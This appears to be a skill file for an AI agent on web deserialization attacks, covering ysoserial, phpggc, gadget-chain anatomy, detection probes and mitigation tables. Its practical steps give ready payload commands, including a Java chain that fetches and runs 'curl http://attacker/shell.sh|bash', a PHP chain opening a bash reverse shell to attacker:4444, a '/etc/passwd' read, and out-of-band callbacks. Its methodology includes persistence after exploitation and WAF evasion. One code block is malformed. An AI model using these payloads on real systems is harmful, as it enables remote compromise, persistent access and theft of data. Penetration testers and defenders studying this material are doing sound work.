# web-deserialization

# Skill: Web Deserialization Attacks

> **Supplementary Files**:
> - `payloads.md` -- Deserialization payloads for Java, PHP, .NET, Python, Ruby, Jackson/Fastjson, and bypass techniques
> - `test-cases.md` -- Structured test cases covering all major deserialization attack vectors (8 test cases)
> - `guides/` -- In-depth guides for Java ysoserial, PHP phpggc, cross-platform deserialization, Node.js deserialization, and .NET deserialization

## Summary

Web Deserialization skill domain covering web attack operations.

**Tools**: ysoserial, phpggc, marshalsec, ysoserial.net, gadgetprobe, jackson-deserialization

**Domain**: web-attack

**OWASP**: A08:2021-Software Integrity Failures

**MITRE ATT&CK**: T1190-Exploit Public-Facing App

## Description

Deserialization vulnerabilities arise when an application reconstructs objects from byte streams (Java), serialized strings (PHP), Base64 blobs (.NET), or pickle data (Python) supplied by the client. The root cause is that deserialization can invoke arbitrary class constructors, magic methods (`__wakeup`, `readObject`, `readResolve`), or property setters that chain together into "gadget chains" terminating in dangerous operations like `Runtime.exec()`, `file_put_contents()`, or `Process.Start()`.

These vulnerabilities are particularly dangerous because they often lead directly to unauthenticated RCE, bypass authentication mechanisms, or enable denial-of-service through resource exhaustion. Detection is challenging because serialized payloads are opaque binary or encoded data that traditional WAF rules struggle to inspect.

Key attack surfaces include:
- HTTP cookies containing serialized session data
- POST parameters with Base64-encoded object streams
- REST API endpoints accepting JSON/XML with type hints (`@class`, `__type`)
- Message queues and RPC protocols (RMI, AMQP)
- File upload handlers that deserialize embedded objects
- View state fields in web frameworks (ASP.NET `__VIEWSTATE`, JSF)

## Use Cases

1. **Java RCE via ysoserial** -- Generate CommonsCollections gadget chains to exploit Apache Commons, Spring, Hibernate, and other Java libraries
2. **PHP object injection** -- Abuse Laravel, WordPress, Magento, and custom framework gadget chains via phpggc
3. **.NET ViewState deserialization** -- Exploit machineKey disclosure or weak validation to achieve RCE via ysoserial.net
4. **Blind deserialization detection** -- Use DNS/HTTP callbacks and time delays to confirm deserialization without visible output
5. **JSON/XML deserialization** -- Exploit polymorphic deserialization in Jackson, Fastjson, and XStream
6. **Python pickle RCE** -- Craft malicious pickle payloads targeting Flask/Django session stores or IPC channels
7. **Ruby deserialization** -- Exploit ERB, Gem, and Rails gadget chains
8. **Gadget chain analysis** -- Use GadgetProbe to enumerate available classes and identify exploitable chains
9. **WAF bypass** -- Evade deserialization detection through encoding, compression, and payload obfuscation

## Core Tools

| Tool | Language | Purpose | Key Features |
|------|----------|---------|--------------|
| **ysoserial** | Java | Generate Java gadget chain payloads | 50+ gadget chains, custom command execution, file-based payloads |
| **phpggc** | PHP | Generate PHP gadget chain payloads | Laravel, WordPress, Magento, Guzzle, Monolog chains |
| **marshalsec** | Java | Deserialization research and marshalling exploits | RMI/JMX/LDAP/JRMP servers, JSON/XML marshalling |
| **ysoserial.net** | .NET | Generate .NET gadget chain payloads | ViewState, BinaryFormatter, LosFormatter, NetDataContractSerializer |
| **gadgetprobe** | Java | Enumerate classpath and identify gadget chains | DNS exfiltration, classpath mapping, chain feasibility |
| **jackson-deserialization** | Java/JSON | Jackson/Fastjson deserialization exploit toolkit | Polymorphic type handling, `@JsonTypeInfo` exploitation, CVE database |

## Methodology

### Phase 2: Gadget Chain Selection

1. Map target framework and library versions from fingerprinting data
2. Cross-reference with ysoserial/phpggc/ysoserial.net gadget chain databases
3. Select chains matching available libraries (CommonsCollections, Spring, Hibernate, etc.)
4. Consider chain reliability -- some chains are version-specific or JVM-dependent

### Phase 3: Payload Generation and Delivery

1. Generate payloads using the appropriate tool (ysoserial, phpggc, ysoserial.net)
2. Encode payload for the delivery vector (Base64, URL-encoding, gzip compression)
3. Inject payload into the identified input vector
4. Monitor for execution via OOB callbacks (DNS, HTTP) or time-based indicators

### Phase 4: Post-Exploitation

1. Confirm RCE and establish persistent access if authorized
2. Escalate from deserialization to full application compromise
3. Document chain used, libraries required, and exploit reliability

## Practical Steps

### Java Deserialization with ysoserial

```bash
# List all available gadget chains
java -jar ysoserial.jar --help

# Generate CommonsCollections5 payload for command execution
java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned' | base64 -w0

# Generate payload with URL-encoded output for GET parameters
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker/shell.sh|bash' | base64 -w0 | python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()))"

# Use JRMP client for more reliable exploitation
java -jar ysoserial.jar JRMPClient 'attacker:1099' | base64 -w0

# Start a JRMP listener to serve payloads
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'id'
```

### PHP Deserialization with phpggc

```bash
# List available gadget chains
phpggc -l

# Generate Laravel RCE1 chain
phpggc Laravel/RCE1 'system("id")'

# Generate WordPress chain with base64 wrapper
phpggc -b WordPress/Generic 'system("cat /etc/passwd")'

# URL-encode output for GET parameter injection
phpggc -u Magento/RCE2 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
```

# DNS callback with GadgetProbe
java -cp gadgetprobe.jar GadgetProbe --dns-callback attacker.burpcollaborator.net --input serialized_data.bin

# HTTP OOB callback
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker/deser-confirm' | base64 -w0
```

### Prevention

- **Integrity checks**: Sign serialized data with HMAC; reject data with invalid signatures
- **Type whitelisting**: Only allow deserialization of expected classes; block all others
- **Replace serialization**: Use JSON or Protocol Buffers for data interchange instead of native serialization
- **Patch libraries**: Keep all libraries updated to prevent gadget chain availability
- **Input validation**: Validate all deserialized data against a strict schema before processing
- **Sandbox**: Run deserialization in a restricted security manager or sandbox environment

### Framework-Specific Mitigations

| Framework | Mitigation |
|-----------|-----------|
| Java | Override `ObjectInputStream.resolveClass()` with whitelist; use `SerialKiller` filter |
| PHP | Disable `unserialize()` for user input; use `json_decode()` instead |
| .NET | Set `MachineKey` validation; use `AspNetEnforceViewStateMac=true`; migrate to `DataProtector` |
| Python | Never pickle untrusted data; use `json` or `safe_load` with PyYAML |
| Jackson | Disable `DEFAULT_TYPING`; use `@JsonTypeInfo(use=Id.NAME)` with whitelist |
| Ruby | Avoid `Marshal.load` on user data; use JSON with permitted classes only |

## Language-Specific Payload Strategies

Each language platform has unique serialization formats, gadget chain ecosystems, and delivery mechanisms. This section provides a quick reference for approaching deserialization exploitation by language.

### Java

- **Format**: Binary stream (magic bytes `0xACED0005`, Base64 starts with `rO0AB`)
- **Key tools**: ysoserial, marshalsec, GadgetProbe
- **Primary chains**: CommonsCollections (1-7), Spring (1-2), Hibernate (1-2), Groovy1, Jdk7u21
- **Delivery**: HTTP cookies, POST bodies, RMI/T3 protocol, JMXInvokerServlet, SOAP headers
- **Detection**: GadgetProbe DNS enumeration, time-based sleep payloads, HTTP callbacks

### PHP

- **Format**: Text-based (`O:<len>:"<class>":<count>:{...}`)
- **Key tools**: phpggc
- **Primary chains**: Laravel (RCE1-8), WordPress/Generic, Magento/RCE1-2, Monolog, Guzzle, Symfony
- **Delivery**: Cookies, POST parameters, phar:// wrapper triggers via file operations
- **Detection**: Inject `O:1:"X":0:{}` and observe "Class not found" errors

### .NET

- **Format**: Binary (Base64 starts with `AAQAA`), LosFormatter, ViewState
- **Key tools**: ysoserial.net
- **Primary chains**: ObjectDataProvider, TypeConfuseDelegate, ActivitySurrogateSelector, TextFormattingRunProperties, WindowsIdentity
- **Delivery**: `__VIEWSTATE` field, BinaryFormatter API endpoints, WCF services, remoting
- **Detection**: Identify ViewState without MAC, check for machineKey disclosure

### Python

- **Format**: Pickle bytecode (starts with `\x80` + protocol version)
- **Key tools**: Custom scripts using `pickle` stdlib module
- **Primary techniques**: `__reduce__` method overriding, eval/exec calls, subprocess.check_output
- **Delivery**: Flask/Django session cookies, Celery task queues, IPC channels, PyYAML unsafe load
- **Detection**: Check for pickle protocol bytes in cookies, test with sleep-based payloads

### Ruby

- **Format**: Marshal binary (starts with `\x04\x08`), YAML with type tags
- **Key tools**: Custom Ruby scripts, rails-cookie-decryptor
- **Primary chains**: ERB, Gem::RequestSet, Gem::Requirement, Rails cookie Marshal
- **Delivery**: Rails cookies (Marshal-serialized), YAML.load on user input, Devise remember_token
- **Detection**: Identify Rails session cookie format, test for secret_key_base disclosure

### Node.js

- **Format**: JSON with function serialization markers (`_$$ND_FUNC$$`)
- **Key tools**: Custom scripts, node-serialize exploitation
- **Primary techniques**: IIFE injection via `_$$ND_FUNC$$`, prototype pollution chains, funcster exploitation
- **Delivery**: Serialized session cookies, API endpoints accepting serialized objects, express middleware
- **Detection**: Look for node-serialize or funcster in dependency list, test with IIFE markers

### Chain Anatomy

Every gadget chain consists of three components:

1. **Kick-off gadget**: The method invoked during deserialization. In Java, this is typically `readObject()`, `readResolve()`, or `readObjectNoData()`. In PHP, it is `__wakeup()` or `__destruct()`.

2. **Chain gadgets**: Intermediate classes that pass control from the kick-off to the sink. These are typically map/collection implementations, transformer objects, or proxy wrappers. The key property is that each gadget calls a method on the next gadget without any security checks.

3. **Sink gadget**: The final dangerous operation -- usually `Runtime.exec()`, `ProcessBuilder.start()`, `system()`, `eval()`, or `file_put_contents()`.

### Chain Discovery Process

When pre-built chains fail, manual chain discovery requires:

1. **Classpath enumeration**: Use GadgetProbe or manual JAR analysis to identify available classes
2. **Source identification**: Find classes with `readObject()`, `__wakeup()`, or equivalent that delegate to property-controlled methods
3. **Sink identification**: Find classes that execute commands, write files, or load code
4. **Chain construction**: Map a path from source to sink through available intermediate classes
5. **Payload generation**: Construct the serialized object graph that instantiates the chain

### Common Chain Patterns

| Pattern | Description | Example |
|---------|-------------|---------|
| Transformer chain | ChainedTransformer applies a series of function calls | CommonsCollections 1-7 |
| Template injection | Loads bytecode via ClassLoader from TemplatesImpl | CommonsCollections2, CommonsCollections4 |
| JNDI redirect | Deserialized object triggers remote class loading via JNDI | JRMPClient, Jdk7u21 |
| Property delegation | Object properties trigger method calls on nested objects | Spring1, Hibernate1 |
| Magic method chain | __wakeup/__destruct calls method on property that triggers next gadget | Laravel RCE chains |
| Delegate invocation | MulticastDelegate or EventHandler redirects method calls | TypeConfuseDelegate, ObjectDataProvider |

## Deserialization Detection Techniques

Detecting deserialization vulnerabilities in black-box and gray-box testing requires a systematic approach combining fingerprinting, probing, and confirmation.

### Passive Fingerprinting

Identify serialization formats in HTTP traffic without actively sending payloads:

1. **Java**: Look for Base64 strings starting with `rO0AB` in cookies, headers, or POST parameters. The raw hex `AC ED 00 05` is the Java serialization magic header.

2. **PHP**: Look for strings matching the pattern `O:<digits>:"<classname>":<count>:{...}` or `a:<count>:{...}` in cookies and parameters.

3. **.NET**: Look for Base64 strings starting with `/wE` (ViewState) or `AAQAA` (BinaryFormatter) in `__VIEWSTATE` hidden fields.

4. **Python**: Look for Base64 strings that decode to bytes starting with `\x80\x04` or `\x80\x05` (pickle protocol 4/5) in session cookies.

5. **Ruby**: Look for Base64 strings that decode to bytes starting with `\x04\x08` (Marshal format) in Rails session cookies.

### Active Probing

Inject benign payloads to confirm deserialization is occurring:

```bash
# Java: Inject minimal serialized object and watch for ClassNotFoundException
echo "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==" | base64 -d | \
  python3 -c "import sys; data=sys.stdin.buffer.read(); data=data.replace(b'HashMap',b'AAAAAAA'); import base64; print(base64.b64encode(data).decode())"

# PHP: Inject invalid class and look for error messages
curl -s http://target/ -b "data=O:1:\"X\":0:{}" | grep -i "class.*not found\|unserialize"

# .NET: Inject invalid ViewState and observe error

<!-- truncated for token budget -->

